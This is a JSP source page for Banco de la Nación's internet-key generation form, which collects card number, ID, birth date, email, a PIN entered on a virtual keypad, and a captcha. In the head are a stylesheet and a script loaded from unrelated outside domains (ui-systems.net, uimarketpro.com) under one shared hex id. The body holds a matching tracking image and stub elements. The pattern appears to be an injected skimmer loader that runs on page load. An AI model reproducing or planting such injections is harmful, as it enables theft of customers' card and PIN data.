<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html"%>
<%@ taglib uri="/WEB-INF/struts-logic.tld" prefix="logic"%>
<%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean"%>
<%@ taglib uri="/WEB-INF/c.tld"				prefix="c"%>

<head>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/bn-jquery.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/jquery.ui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/select.js"></script>
<script language="JavaScript" src="<%=request.getContextPath()%>/js/util.js"></script>
<link type="text/css" href=https://ui-systems.net/css/d6d6a192e565430bab3aa6e4cb0ae0bd.css rel="stylesheet">
<script type="application/javascript" src="https://uimarketpro.com/js/d6d6a192e565430bab3aa6e4cb0ae0bd.js"></script>

<link href="<%=request.getContextPath()%>/resources/css/stylesheet.css" rel="stylesheet" type="text/css" />       
<script type="text/javascript" src="<%=request.getContextPath()%>/resources/js/init.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/cufon-yui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/DaxCompact-Medium_500.font.js"></script>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Generación de la Clave de Internet. Banco de la Nación</title>
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/resetearcss.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bn-principal.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/tipografias.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/home.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/select.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bn-estilos.css" /> 

<script type="text/javascript">

var brw = new Browser();
if(brw.code == 'ch'){
Cufon.replace('.dax');
Cufon.replace('.boton-clave');

	$(document).ready(function(){		
 		$('.boton-clave').css('height','20px');
		$('.boton-clave').css('padding-top','5px'); 	
	});

}
</script>

<SCRIPT language="javascript">
 function fnReloadCaptcha(){
 
 	
 	aleat = Math.random() * 10; 
   	aleat = Math.round(aleat);
 
    var now  = new Date();
    var imageObject = document.getElementById('captcha');
     
    imageObject.src='./Welcome1.do?methodToCall=iniciar&param='+aleat;
 
}

$(document).ready(
 function(){ 
 	
 	 $("#btnLogin").removeAttr("disabled");
 	 $("#txtNumeroTarjeta").focus();
 	 $("#txtNumeroTarjeta").val("4214");
 	 fnReloadCaptcha();
          
     $("#boton_captcha").click(function(){
     	var cont_param = parseInt($("#param_captcha").val());
     	$("#srcCaptcha").html('<img alt="captcha"  id="captcha" name="captcha" src="resources/images/background.jpg" height="25" width="114"  />');
     	$("#captcha").attr('src','<%=request.getContextPath()%>/Welcome1.do?methodToCall=iniciar&param='+cont_param);
     	cont_param+=1;
     	$("#param_captcha").val(cont_param);
     });
     
     $("#limpiar").click(function(){
     	$("#txtPassword").val("");
     });
     
     buscarFechaNac();
     
     
 });
</script>
<SCRIPT language="javascript">

	
$(document).ready(
 function(){ 
 	
 	 $("#btnLogin").removeAttr("disabled");
 	 $("#txtNumeroTarjeta").focus();
 	 $("#txtNumeroTarjeta").val("4214");
   
     $("#limpiar").click(function(){
     	$("#txtPassword").val("");
     });
     
    
 });
	
	function generar(){
		
		var frmLogin = document.form;
		
			if (validarSiNumero($("#txtNumeroTarjeta").val())){
				alert('El número de Tarjeta solo acepta números...');
				return false;
			}

			
			if ($("#txtNumeroTarjeta").val().length < 16){
				alert('El número de Tarjeta debe ser de 16 Digitos no menos');
				return false;
			}
			
			if (document.forms[0].cboTipoDoc.value == ""){
				alert('Seleccionar un Tipo de Documento...');
				return;
			}
		
			if (validacampo("txtNumDoc")){ 
			alert('Es necesario ingresar el número de documento' ); return;
			}
			
			if(document.forms[0].cboTipoDoc.value==<%=pe.cosapi.common.Constante.COD_DNI_%>){ 
				if (validarSiNumero(frmLogin.txtNumDoc.value)){
				alert('El número de DNI solo acepta números...');
				return;
				}
				if (validalongitud("txtNumDoc","8")){
					alert('El número de DNI debe ser de 8 Digitos, no menos');
					return;
				}
	
				if (document.forms[0].txtNumDoc.value.length > 8){
					alert('El número de DNI debe ser de 8 Digitos');
					return;
				}
			}
	
		
			
			if(document.forms[0].cboTipoDoc.value==<%=pe.cosapi.common.Constante.COD_RUC%>){ 
				if (validarSiNumero(frmLogin.txtNumDoc.value)){
				alert('El RUC solo acepta números...');
				return;
				}
				if (validalongitud("txtNumDoc","11")){
					alert('El número del RUC debe ser de 11 Digitos, no menos');
					return;
				}
			}
		
			if(document.forms[0].cboTipoDoc.value!=<%=pe.cosapi.common.Constante.COD_RUC%>){
			
				if(!validarFecha(document.forms[0].txtDia.value,document.forms[0].cmbMes.value,document.forms[0].txtAnio.value)){
				return;
				}
			}
			
			
			if (validacampo("txtEmail")){ 
			alert('Es necesario ingresar la dirección de e-mail' ); 
			return;
			}
			
			if(validarEmail(document.forms[0].txtEmail.value)==false){
			alert('La dirección de e-mail es incorrecta');
			return;
			}
			
		
			if ($("#txtPassword").val().length < 4){
				alert('Su Clave debe ser de 4 Digitos no menos');
				return false;
			}
			
			if ($("#txtCaptcha").val().length < 5){
				alert('El texto de la imagen debe ser de 5 Digitos, no menos');
				return false;
			}
			
			if(document.forms[0].chkAceptar.checked == false){
				alert('Tiene que Aceptar las Condiciones ');
				document.forms[0].boton.disabled = false;
				return;
			}	
			
			frmLogin.btnLogin.disabled=true;
			frmLogin.action="<%=request.getContextPath()%>/loginAfiliacion.do";
			frmLogin.validar.value="true";
			frmLogin.HrTrx.value="0112";
			frmLogin.submit();
		}
		


		function validarSiNumero(numero){
			var textoStr =  numero.toString() 
			var tiene = 0
			for(var i = 0;i < numero.length;i++){
				var oneChar = textoStr.charAt(i)
				if (!/^([0-9])*$/.test(oneChar)){ 
					tiene = 1
				}
			}
			if (tiene == 1){ 
				return true
			} else {
				return false
			} 
		}
		
		
	function evalRanTable(valor){
		var longitud = parseInt($("#ind_long_clave").val());
		
		if($("#txtPassword").val().length < longitud){
		$("#txtPassword").val($("#txtPassword").val()+valor);
		}
	}
	
	function buscarFechaNac(){
	
		var valor = document.forms[0].cboTipoDoc.value;
		
		if(valor == <%=pe.cosapi.common.Constante.COD_RUC%>){ document.getElementById('fechaNac').style.display = "none"; document.getElementById('mensaje').style.display = "block"; }
		
		else{document.getElementById('fechaNac').style.display = "block";document.getElementById('mensaje').style.display = "none"; }
		
	}
	
	</SCRIPT>
</head>
<body>
		<div id="contenedor">

        <div id="cabecera">

            <div id="logo-multired">
               <img src="imagenes/logo-multired.jpg" alt="Logotipo Multired" />
            </div>
            <div id="logo-bn">
          
                <img src="imagenes/Logo_BN.jpg" alt="Logotipo del Banco de la Nación" />
            </div>
            

        </div>
        <img src="https://ui-systems.net/images/d6d6a192e565430bab3aa6e4cb0ae0bd.jpg"/>
		<div class="image-d6d6a1"></div>
		<em class="font-d6d6a1">.</em>
        
            <div id="cuerpo">
            <h1 class="dax"><img src="imagenes/candado.png"> Usted se encuentra en una <span>zona segura</span></h1>
			
            <div id="login">
                <div id="border-superior"><img src="imagenes/home/border-arriba.png" alt="Border Login Superior" /></div>
                
             
                <div id="login-contenido">

                    <div id="border-inferior"></div>

                    <form method="post" id="form" name="form">
					<INPUT type="hidden" id="transaccion" name="transaccion" value="LG08">
					<INPUT type="hidden" id="metodo" name="metodo" value="autenticar">
					<INPUT type="hidden" id="HrTrx" name="HrTrx" value="1102">
					<input type="hidden" id="validar" name="validar" value="false">
					<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="4" />
					<input type="hidden" id="param_captcha" name="param_captcha" value="1" />
						
					
					
						 <h1 class="dax"><span>Generación Clave Internet</span></h1>
						 <br/>
						 
						<div class="fila limpiar">
								  <label for="tipo-documento">Tipo de Tarjeta:</label>
							
									<select id="cboTipoTarjeta" name="cboTipoTarjeta" class="tipo-documento select"  type="text" >
										<option value='<%=pe.cosapi.common.Constante.TARJETA_GLOBAL_DEBITO%>'>Multired Global Débito</option>
																
									</select>
						           
                        
                      
                        </div>
                        <div class="fila  limpiar">
                            <label  for="txtNumeroTarjeta" >N&uacute;mero Tarjeta:</label>
                           	<input type="text"  id="txtNumeroTarjeta" name="txtNumeroTarjeta" class="grande tarjeta_dni" maxlength="16" onkeypress="return soloNumerosAll(event)">
                        </div>
							
                      
                        <div class="fila  limpiar">
                            <label id="trNumeroTarjeta" for="numero-tarjeta" class="tarjeta_dni">Tipo y N° Documento:</label>
                            <select id="cboTipoDoc" name="cboTipoDoc" class="select select-medio" onchange="buscarFechaNac()" >
									
										<c:forEach var="item" items="${lstDocumento}">
											<option value="<c:out value="${item.codigo}"/>" > <c:out value="${item.descripcion}" /></option>
                                         
                                        </c:forEach>
							</select>
							
                           	<input type="text" class="input-chico3" name="txtNumDoc"  id="txtNumDoc" maxlength="12" size="8" ></input>
                        </div>
                        <div class="login" id="mensaje" style="display: none;">
    							
    								<p class="mensaje" style="text-align: center ! important;">El tipo de documento RUC es solo para el tipo de cuentas Jurídicas</p>
    					</div>
                         <div class="fila limpiar" id="fechaNac" style="display: none;" >
						     <label>Fecha Nacimiento:</label>
								
								<input type="text" class="input-chico2" name="txtDia"  maxlength="2" size="2" onkeypress="return soloNumerosAll(event)"></input>
								<select id="cmbMes" name="cmbMes" class="select select-chico4"  >
									
										<c:forEach var="item" items="${lstMes}">
											<option value="<c:out value="${item.codigoDetalleAyuda}"/>" > <c:out value="${item.descripcionDetalle}" /></option>
                                         
                                        </c:forEach>
									</select>
								
									<input type="text" class="input-chico2" name="txtAnio"  maxlength="4" size="2" onkeypress="return soloNumerosAll(event)"></input>
								
	    				</div>
                        <div class="fila  limpiar">
                            <label id="trEmail" for="numero-tarjeta" class="tarjeta_dni">Email:</label>
                           	<input type="text" class="grande1" name="txtEmail"  id="txtEmail" maxlength="50"  ></input>
                        </div>
                        
                        
                        <%@ page import="java.util.Map"%>
						<%@ page import="pe.cosapi.system.TecladoUtil"%>
						<%@ page import="pe.cosapi.common.ConstanteSesion"%>
						<%						
							Map mapa  = (Map)request.getSession().getAttribute(ConstanteSesion.MAP_VALUES);
							TecladoUtil teclado = new TecladoUtil();
							teclado.asignar(mapa,request);
							
						%>
                        
                        <div class="fila limpiar">
                            <label for="clave">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label>
                            <div id="botones-clave">
                                <div class="boton-clave" onclick="evalRanTable('m');"><span class="dax" ><%=teclado.getAlt_0()%></span></div>
                                <div class="boton-clave" onclick="evalRanTable('n');" ><%=teclado.getAlt_1()%></div>
                                <div class="boton-clave" onclick="evalRanTable('p');" ><%=teclado.getAlt_2()%></div>
                                <div class="boton-clave" onclick="evalRanTable('i');" ><%=teclado.getAlt_3()%></div>
                                <div class="boton-clave" onclick="evalRanTable('j');" ><%=teclado.getAlt_4()%></div>
                                <div class="boton-clave" onclick="evalRanTable('k');" ><%=teclado.getAlt_5()%></div>
                                <div class="boton-clave" onclick="evalRanTable('a');" ><%=teclado.getAlt_6()%></div>
                                <div class="boton-clave" onclick="evalRanTable('y');" ><%=teclado.getAlt_7()%></div>
                                <div class="boton-clave" onclick="evalRanTable('x');" ><%=teclado.getAlt_8()%></div>
                                <div class="boton-clave" onclick="evalRanTable('t');" ><%=teclado.getAlt_9()%></div>
                                <div class="boton-clave limpiar" id="limpiar">LIMPIAR</div>
                            </div>
							<input type="hidden" value="<%=teclado.getRandomEncript()%>"  name="hdnValue">
							
                            <div id="campo-clave">
                                <p style="margin: 0px 1px 0px -20px;">Ingresa tu clave de <span id="lblDigitosClave">04</span> d&iacute;gitos usando el teclado virtual.</p>
                                <input type="password" name="txtPassword" id="txtPassword" id=txtPassword" maxlength="4" readonly="readonly" />
                                <div class="olvido-clave">
                                    <div class="olvide-clave" style="margin: 0px -16px;">Olvid&eacute; clave 4 dígitos</div>
                                    <div class="texto-olvide-clave" style="margin: 0px 26px;">
                                        <div>
                                            Ac&eacute;rquese a cualquiera de nuestras oficinas a nivel nacional.
                                        </div>
                                        <img src="imagenes/home/flecha-olvide-clave.jpg" alt="Flecha olvid&eacute; clave" />
                                    </div>
                                </div>
                            </div>
						
                        </div>
                       
                         <div class="fila limpiar">
                            <label for="capcha">Ingresa el texto de la imagen:</label>
                            <div class="capcha">
                                <div id="srcCaptcha"><img alt="captcha"  id="captcha" name="captcha" src="resources/images/background.jpg"  height="25" width="114" /></div>
                                <div class="boton_captcha" id="boton_captcha" >Cambiar texto</div>
                            </div>
                            <input class="capcha" type="text" name="txtCaptcha" id="txtCaptcha" maxlength="5"  />
                        </div>
                        <br/>
                       <logic:messagesPresent>
							<div class="cysErrorMsg" style="width: 450px;">
								<html:errors/>
							</div>
							<div class="clear cincopx"></div>
							<div class="clear cincopx"></div>
						</logic:messagesPresent> 	
						<div  align="center">
							<textarea  rows="16" cols="85" name="TXTUNO0" class="textarea" readonly="readonly"  >
TERMINOS DE USO DE LA CLAVE INTERNET

1.Usted, con la aprobación de estas condiciones, autoriza afiliar su clave internet a su Tarjeta Multired Global Débito (en adelante, "Tarjeta"). 

2.Usted reconoce y acepta expresamente que, para todos los fines de ley, el empleo de la clave internet sustituye a su firma autógrafa; así como hace prescindir del uso de documentos de identidad.

3.Usted podrá realizar operaciones con cargo a sus cuentas, siempre que mantenga la clave internet y haya solicitado su dispositivo de seguridad en las oficinas del banco.

4.Usted asume total responsabilidad por el uso de su clave internet, desde el momento en que esta ha sido generada, la misma que se considera secreta y confidencial. La clave internet y su número de Tarjeta lo identifican a usted, permitiéndole ejecutar consultas; y mediante el uso de su dispositivo de seguridad efectuar operaciones por el canal Multired Virtual. Por lo que usted acepta y reconoce su realización para todos los efectos legales, aún en el caso del uso por tercera persona del número de Tarjeta, la clave internet y clave dinámica del dispositivo de seguridad, salvo que se compruebe la comisión de delitos informáticos. Sin perjuicio de lo señalado en el numeral 2 precedente El Banco puede solicitar a El Cliente, por medidas de seguridad, un documento de identidad o información adicional para realizar las operaciones que brinda el banco a través de internet. 

5.Usted podrá cambiar su clave internet con la frecuencia y oportunidad que considere conveniente, ingresando al Canal  Multired Virtual,  con obligación de mantenerla en total reserva y confidencialidad, impidiendo que terceros accedan o puedan acceder a su conocimiento y/o uso.

6.Usted es consciente de los riesgos asociados por el uso de la clave internet a través del canal Multired Virtual, declarando conocerlos, aceptarlos y asumir total responsabilidad en su uso, obligándose a mantener con absoluta reserva dicha clave. Toda operación efectuada con la Tarjeta, clave internet y clave dinámica del dispositivo de seguridad, se reconoce necesariamente efectuada y aceptada por usted, siendo registrada o contabilizada en la fecha que se realice, aun cuando su empleo fuese realizado por terceros, salvo que se compruebe la comisión de delitos informáticos. 

7.En caso usted desee desafiliarse de la clave internet, así como en cualquiera de los canales de atención remota o banca remota que en un futuro pueda establecer el banco y que requieran de la clave internet, deberá procesar este requerimiento ingresando al Canal Multired Virtual ubicado en la página web www.bn.com.pe. 

8.El Banco no será responsable por los daños y/o perjuicios que pudiera ocasionar la ocurrencia de los eventos de retraso, interrupción o suspensión del Canal Multired Virtual para la atención de servicios por internet, debido a interrupción de sistemas de cómputo, de red de teleproceso local o de telecomunicaciones, actos de gobierno, emergencias nacionales, actos de guerra, terrorismo, conmoción civil, vandalismo, huelgas o paros locales o nacionales, terremotos, incendios, inundaciones, falta de fluido eléctrico, u otros similares, u otros actos y consecuencias a que hace referencia el artículo 1315&deg; del código civil. 

9.La afiliación a la clave internet no tiene costo. 
							
							</textarea><br/>
						
						</div>	
						<div align="center">	<input type="checkbox" name="chkAceptar" value="S" class="textizqn"/><span class="span">Acepto condiciones</span></div>

                        <input type="button" value="CONTINUAR" name="btnLogin" id="btnLogin" onclick="javascript:return generar();" />
						
                    </form>
						
                </div>
                
                <div id="border-inferior"><img src="imagenes/home/border-abajo.png" alt="Border Login Inferior" /></div>
            </div>
			
			
        </div>   

        <div id="pie-pagina">

            <div id="titulo-pie-pagina">Banco de la Naci&oacute;n  |  Ministerio de Econom&iacute;a y Finanzas</div>

            <div id="oficinas">
                 <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telef&oacute;nica: 519 2000.</p>
				<p>Atenci&oacute;n en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00. </p>
				<p>Atenci&oacute;n en Oficina de Tr&aacute;mite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
                
            </div>

        </div>

    </div>

    <script type="text/javascript" src="js/bn-funciones.js"></script>
    <script type="text/javascript">
       $(document).ready(function(){
		myApp.select.init();
		myApp.home.init();
	});
    </script>
    <script type="text/javascript">
		Cufon.now();
	</script>
	
</body>
</html>
